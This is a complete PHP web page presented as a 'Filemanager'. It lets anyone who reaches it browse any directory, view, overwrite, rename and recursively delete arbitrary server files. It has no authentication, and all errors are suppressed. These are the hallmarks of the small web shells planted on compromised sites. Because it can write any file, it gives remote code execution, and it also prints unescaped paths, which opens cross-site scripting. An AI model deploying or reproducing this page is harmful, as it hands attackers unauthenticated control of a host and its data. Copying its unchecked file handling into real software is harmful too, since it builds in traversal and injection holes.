<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<title>Filemanager</title>
</head>
<style type="text/css">
	div.manager {
		width:70%;
	} td.edit {
		border:none;
		background:none;
	} textarea.edit {
		height:300px;
		resize:none;
	} th {
		text-align:center;
	} .icon {
		width:25px;
		height:25px;
	}
</style>
<body>
<br>
<?php
error_reporting(0);
define('SEP', '/');
if (isset($_GET['dir'])) {
	@chdir($_GET['dir']);
}
function cwd() {
	$cwd = @str_replace('\\', '/', @getcwd());
	return $cwd;
}
function pwd() {
	$dir = @explode('/', @cwd());
	foreach ($dir as $key => $pwd) {
		print("<a href='?dir=");
		for ($i=0; $i <= $key ; $i++) { 
			print($dir[$i]);
			if ($i != $key) {
				print("/");
			}
		} print("'>".$pwd."</a>/");
	}
}
function edit($filename, $text) {
	$fp = @fopen($filename, 'w');
	if (@fwrite($fp, $text)) {
		?>
		<div class="alert alert-success" role="alert">
        This File <b><u><?php print $filename ?></u></b> Has Been Edited
        </div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
         This File <b><u><?php print $filename ?></u></b> Failed To Edited
        </div>
		<?php
	}
}
function renames($filename, $newname) {
	if (@rename($filename, $newname)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Rename to 
			<b><u><?php print $newname ?></u></b>
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Rename
		</div>
		<?php
	}
}
?>
<center>
	<div class="form-control manager" disable>
		<center><h4>FILEMANAGER</h4></center>
		<table width="100%" align="center" class="table-striped">
			<tr>
    		<th colspan="2">
    			<center>
    				<?php print @pwd() ?>
    			</center>
    		</th>
    	</tr>
		<tr>
		<?php
			function delete($dir) {
	if (@is_dir($dir)) {
		$scandir = @scandir($dir);
		foreach ($scandir as $object) {
			if ($object != '.' && $object != '..') {
				if (@is_dir($dir.DIRECTORY_SEPARATOR.$object)) {
					@delete($dir.DIRECTORY_SEPARATOR.$object);
				} else {
					@unlink($dir.DIRECTORY_SEPARATOR.$object);
				}
			}
		} if (@rmdir($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Failed to Deleted
            </div>
            </center>
		    <?php
		}
	} else {
		if (@unlink($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This File <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This File <b><u><?php print $dir ?></u></b> Failed to Deleted
            </div>
            </center>
		    <?php
		}
	}
}
if ($_POST['do'] == 'delete') {
	@delete($_POST['file']);
}

			if ($_POST['do'] == 'edit') {
	          if (isset($_POST['submit'])) {
		        @edit($_POST['file'], $_POST['text']);
	        } $text = @htmlspecialchars(@file_get_contents($_POST['file']));
	        ?>
	        <form method="post">
	        	<td colspan="2" class="edit">
	        	<textarea class="form-control edit" name="text"><?php print $text ?></textarea></td>
	        	<input type="hidden" name="do" value="edit">
	        	<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
		        <tr><td colspan="2" class="edit">
		        <center>
		        	<input style="width:100%;" type="submit" name="submit" class="btn btn-success">
		        </center></td>
	        </form>
	        <?php
            }
            if ($_POST['do'] == 'renames') {
            	if (isset($_POST['submit'])) {
            		@renames($_POST['file'], $_POST['newname']);
            	}
            	?>
            	<form method="post">
            		<td>
            			<input style="width:100%;" type="text" name="newname" value="<?php print $_POST['file'] ?>">
            		</td>
            		<input type="hidden" name="do" value="renames">
	        	    <input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
            		<td>
            			<input style="width:100%;" type="submit" name="submit">
            		</td>
            	</form>
            	<?php
            }
			?>
		</tr>
    	<tr>
    		<th>Filename</th>
    		<th>Action</th>
    	</tr>
    	<?php
    	$scandir = @scandir(@cwd());
    	foreach ($scandir as $dir) {
    		if (!is_dir($dir)) continue;
    		if ($dir === '.' || $dir === '..') continue;
    		?><tr>
    			<td>
    				<img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon"> 
    				 <a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
    			</td>
    			<td>
    				<center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select name="do">
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    					<input type="hidden" name="file" value="<?php print $dir ?>">
    					<input type="submit" name="">
    				</form>
    			</center>
    			</td>
    		</tr> 
    		<?php
    	}
    	foreach ($scandir as $file) {
    		if (!is_file($file)) continue;
    		?>
    		<tr>
    			<td>
    				<img class="icon" src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png">
    				 <?php print $file ?>
    			</td>
    			<td><center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select name="do">
    						<option value="edit">Edit</option>
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    					<input type="hidden" name="file" value="<?php print $file ?>">
    					<input type="submit">
    				</form>
    			</td>
    		</tr>
    		<?php
    	}
    	?>
    </table>
	</div>
</center>
</body>
</html>
